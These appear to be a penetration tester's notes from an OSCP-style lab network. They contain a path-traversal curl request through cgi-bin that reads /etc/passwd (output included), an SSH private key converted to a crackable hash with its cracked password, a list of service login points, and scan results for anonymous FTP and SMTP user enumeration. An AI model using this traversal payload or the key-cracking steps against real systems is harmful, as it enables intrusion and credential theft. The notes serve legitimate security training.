hints needed
```
Looking for "id_ecdsa" instead of id_rsa with a LFI.
Find everywhere to use the id_edcsa (.246 too)
```

```
─[root@edu-virtualbox]─[/home/edu/OSCP/skylark]
└──╼ #curl http://192.168.186.245/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
offsec:x:1000:1000:Offsec Admin:/home/offsec:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
miranda:x:1001:1001:Miranda:/home/miranda:/bin/sh
steven:x:1002:1002:Steven:/home/steven:/bin/sh
mark:x:1003:1003:Mark:/home/mark:/bin/sh
anita:x:1004:1004:Anita:/home/anita:/bin/sh
apache:x:997:998::/opt/apache2/htdocs/:/sbin/nologin
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
ftp:x:112:118:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin

```



Login points:
```
.245:21   FTP 
.245:2222 SSH (key-only)
.245:8000 WEB (login page)

.249:445  SMB
.249:3389 RDP
.249:5985 WinRM

.248:445  SMB
.248:3389 RDP
.248:5985 WinRM
.248:49965 MSSQL

.247:445  SMB
.247:3389 RDP
.247:5985 WinRM
.247:14020 FTP

.246:2222 SSH (key-only)

.191:445  SMB
.191:3389 RDP
.191:5985 WinRM

.189:25 SMTP
.189:110 POP3
.189:143 IMAP
.189:5985 WinRM
.189:
```

```
id_ecdsa:$sshng$6$16$0ef9e445850d777e7da427caa9b729cc$359$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000100ef9e445850d777e7da427caa9b729cc0000001000000001000000680000001365636473612d736861322d6e69737470323536000000086e697374703235360000004104afad8408da4537cd62d9d3854a02bf636ce8542d1ad6892c1a4b8726fbe2148ea75a67d299b4ae635384c7c0ac19e016397b449602393a98e4c9a2774b0d2700000000b0d0768117bce9ff42a2ba77f5eb577d3453c86366dd09ac99b319c5ba531da7547145c42e36818f9233a7c972bf863f6567abd31b02f266216c7977d18bc0ddf7762c1b456610e9b7056bef0affb6e8cf1ec8f4208810f874fa6198d599d2f409eaa9db6415829913c2a69da7992693de875b45a49c1144f9567929c66a8841f4fea7c00e0801fe44b9dd925594f03a58b41e1c3891bf7fd25ded7b708376e2d6b9112acca9f321db03ec2c7dcdb22d63$16$183
pasword found: fireball
```
### .247
```
14020/tcp open     ftp           FileZilla ftpd                                                                     
| ftp-syst:                                                                                                         
|_  SYST: UNIX emulated by FileZilla                                                                                
|_ftp-bounce: bounce working!                                                                                       
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                              
|_-r--r--r-- 1 ftp ftp         237639 Nov 04  2022 umbraco.pdf 
```


### .189
```
smtp-enum-users: 
|   root
|   admin
|   administrator
|   webadmin
|   sysadmin
|   netadmin
|   guest
|   user
|   web
|_  test
```




